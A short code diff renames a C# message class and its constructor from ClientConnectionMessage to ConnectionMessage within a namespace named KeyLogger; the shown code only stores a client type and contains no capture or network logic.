@@ -5,11 +5,11 @@ using System.Text;
 
 namespace KeyLogger
 {
-    public class ClientConnectionMessage : IMessage
+    public class ConnectionMessage : IMessage
     {
         public ClientType? Type { get; private set; }
 
-        public ClientConnectionMessage(ClientType? clientType = null)
+        public ConnectionMessage(ClientType? clientType = null)
         {
             Type = clientType;
         }
